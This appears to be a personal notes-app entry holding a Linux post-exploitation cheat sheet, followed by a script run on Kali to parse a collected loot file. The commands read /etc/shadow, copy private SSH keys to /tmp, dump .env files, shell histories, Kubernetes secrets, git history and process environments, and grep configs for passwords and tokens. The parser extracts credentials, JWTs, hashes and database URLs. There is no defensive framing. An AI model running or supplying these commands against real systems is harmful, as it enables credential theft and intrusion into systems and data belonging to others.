---
id: "bcul1o9qemqow0gjs"
title: "Find Linux v.1"
tags: []
isFavorite: false
order: "8"
createdAt: "2026-06-22T07:21:48.232Z"
updatedAt: "2026-07-13T10:31:48.256Z"
---
```bash
# === HISTORY FILES ===
find / -name ".bash_history" -o -name ".zsh_history" -o -name ".mysql_history" -o -name ".psql_history" -o -name ".python_history" -o -name ".node_repl_history" 2>/dev/null
for h in /root/.bash_history /home/*/.bash_history /root/.zsh_history /home/*/.zsh_history; do echo "=== $h ==="; cat "$h" 2>/dev/null | grep -iE 'pass|psql|mysql|ssh|scp|curl.*user|token|secret|key|export|connect|login|cred|auth' | tail -50; done

# === CONFIG FILES WITH CREDENTIALS ===
grep -rn --color=always -iE 'password|passwd|pwd|secret|token|api_key|apikey|auth_token|connectionString|jdbc:|DSN' /etc/ /opt/ /var/ /home/ /root/ --include="*.conf" --include="*.ini" --include="*.cnf" --include="*.cfg" --include="*.yaml" --include="*.yml" --include="*.json" --include="*.xml" --include="*.env" --include="*.properties" --include="*.toml" 2>/dev/null

# === .ENV FILES ===
find / -name ".env" -o -name ".env.*" -o -name "*.env" 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null; done

# === DATABASE CONNECTION STRINGS ===
grep -rn --color=always -iE 'postgresql://|mysql://|mongodb://|redis://|jdbc:|sqlserver://|DSN=|DATABASE_URL' /etc/ /opt/ /var/ /home/ /root/ 2>/dev/null



# === SSH KEYS ===
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.key" -o -name "authorized_keys" 2>/dev/null | while read k; do echo "=== $k ==="; cat "$k" 2>/dev/null | head -5; done
# Copy private keys for offline use:
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null | while read f; do cp "$f" /tmp/keys_$(basename $(dirname $f))_$(basename $f) 2>/dev/null; done

# === SHADOW / PASSWD ===
cat /etc/shadow 2>/dev/null
cat /etc/passwd 2>/dev/null
cat /etc/shadow- 2>/dev/null  # backup
cat /etc/master.passwd 2>/dev/null

# === CRONTAB (often has credentials in scripts) ===
for u in $(cut -d: -f1 /etc/passwd); do echo "=== crontab $u ==="; crontab -u $u -l 2>/dev/null; done
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.*/ 2>/dev/null
grep -rn --color=always -iE 'pass|token|key|secret|psql|mysql|mongo|redis|curl' /etc/cron* /var/spool/cron/ 2>/dev/null

# === SYSTEMD TIMERS / SERVICES ===
grep -rn --color=always -iE 'Environment.*=.*(pass|token|key|secret|pwd)' /etc/systemd/ /lib/systemd/ 2>/dev/null

# === DOCKER ===
docker ps 2>/dev/null
docker images 2>/dev/null
docker inspect $(docker ps -q) 2>/dev/null | grep -iE 'ENV|PASS|SECRET|TOKEN|KEY'
docker-compose config 2>/dev/null
grep -rn --color=always -iE 'pass|secret|token|key' /var/lib/docker/ --include="*.json" --include="*.env" --include="*.yml" --include="*.yaml" 2>/dev/null

# === KUBERNETES (if kubelet/kubectl) ===
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null
kubectl get secrets --all-namespaces -o yaml 2>/dev/null
kubectl get pods --all-namespaces 2>/dev/null
cat ~/.kube/config 2>/dev/null

# === GIT REPOS (check for committed secrets) ===
find / -name ".git" -type d 2>/dev/null | while read g; do echo "=== $g ==="; cd "$(dirname $g)"; git log --all -p 2>/dev/null | grep -iE 'pass|secret|token|key|pwd' | head -20; cd - > /dev/null; done
find / -name ".git-credentials" -o -name ".gitconfig" 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null; done

# === WEB CONFIGS ===
find / -name "wp-config.php" -o -name "configuration.php" -o -name "settings.py" -o -name "settings.ini" -o -name "local_settings.py" 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null; done
grep -rn --color=always -iE 'DB_PASS|DB_USER|DB_HOST|DB_NAME' /var/www/ /opt/ /etc/ --include="*.php" --include="*.py" --include="*.js" 2>/dev/null

# === SHARED MEMORY / TMP FILES (sometimes creds in temp files) ===
find /tmp/ /var/tmp/ /dev/shm/ -type f -name "*.txt" -o -name "*.log" -o -name "*.sql" -o -name "*.csv" 2>/dev/null | while read f; do echo "=== $f ==="; grep -liE 'pass|secret|token|key' "$f" 2>/dev/null; done

# === LSOF (process env vars often have passwords) ===
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'PASS|SECRET|TOKEN|KEY|AUTH|PSQL|MYSQL|MONGO|REDIS' | sort -u
# Or for specific processes:
for pid in $(ps aux | grep -iE 'postgres|mysql|mongo|redis|java|python|node|nginx|apache' | awk '{print $2}' 2>/dev/null); do echo "=== PID $pid ==="; cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n'; done

# === LASTLOG / WTMP (who logged in recently) ===
last -20 2>/dev/null
lastlog 2>/dev/null
who 2>/dev/null
w 2>/dev/null
```


---Parsing results--- on kali
Создаем скрипт и смотрим результаты
cat << 'EOF' > parse.sh
#!/bin/bash
F="data_inet_16.06.2026.md"

echo "====== CREDENTIALS ======"
grep -oP '(?i)(?:password|passwd|secret|token|api_key|apikey)\s*[=:]\s*["\x27]?\K[^\s"\x27;,#]{6,}' "$F" | sort -u | grep -vE '^(\$|%|<|your|change|example|null|none|false|true)'

echo "====== DB URLS ======"
grep -oP '(?:postgresql|mysql|mongodb|redis|jdbc)://\S+' "$F" | sort -u

echo "====== PRIVATE KEYS ======"
grep -n "BEGIN.*PRIVATE" "$F"

echo "====== JWT ======"
grep -oP 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' "$F" | sort -u

echo "====== HASHES ======"
grep -oP '\$[0-9a-z]+\$\S+' "$F" | sort -u

echo "====== IPs ======"
grep -oP '\b(?:\d{1,3}\.){3}\d{1,3}\b' "$F" | sort -u | grep -v '127\.\|0\.0\.0'

echo "====== BASE64 DECODE ======"
grep -oP '[A-Za-z0-9+/]{20,}={0,2}' "$F" | sort -u | while read b; do
  decoded=$(echo "$b" | base64 -d 2>/dev/null | strings)
  [ -n "$decoded" ] && echo "$b -> $decoded"
done
EOF
chmod +x parse.sh && bash parse.sh